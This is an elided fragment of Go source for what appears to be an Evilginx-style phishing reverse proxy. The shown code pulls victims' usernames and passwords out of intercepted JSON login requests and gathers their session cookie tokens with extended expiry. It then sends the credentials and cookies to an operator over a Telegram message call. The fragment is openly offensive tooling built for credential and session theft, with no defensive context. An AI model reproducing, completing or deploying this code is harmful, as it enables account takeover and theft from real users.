...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
					...
					if err == nil {
						...
						if json_re.MatchString(contentType) {
							...
							if pl.username.tp == "json" {
								...
								if um != nil && len(um) > 1 {
									usrnm = um[1]
									message := fmt.Sprintf("Username captured for session [%d]:\n\n:%s", ps.Index, usrnm)
									fmt.Println(message)
									...
									log.Success("[%d] Username: [%s]", ps.Index, usrnm)
							...
							if pl.password.tp == "json" {
								...
								if pm != nil && len(pm) > 1 {
									...
									log.Success("[%d] Password: [%s]", ps.Index, passwd)
									message := fmt.Sprintf("Password captured for session [%d]:\n\n%s", ps.Index, passwd)
									fmt.Println(message)
									if err := SendTelegramMessage(message); err != nil {
										fmt.Printf("error sending telegram message: %v\n", err)
									}
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted! Sending to Telegram", ps.Index)
						var cookies []CookieJSON
	for domain, domainCookies := range s.CookieTokens {
		for name, token := range domainCookies {
			cookie := CookieJSON{
				Path:           "/",
				Domain:         domain,
				ExpirationDate: time.Now().AddDate(0, 2, 0).Unix(), // Set expiration date to 2 months from now
				Value:          token.Value,
				Name:           name,
	...
	if usrnm == "" {
		usrnm = "default_username"
	}
	if passwd == "" {
		passwd = "default_password"
	}
						message := fmt.Sprintf("All cookie authentication tokens captured for session [%d]:\n\nUsername: %s\nPassword: %s\n\n%s", ps.Index, usrnm, passwd, jsonData)
						fmt.Println(message)
						if err := SendTelegramMessage(message); err != nil {
							fmt.Printf("error sending telegram message: %v\n", err)
						}
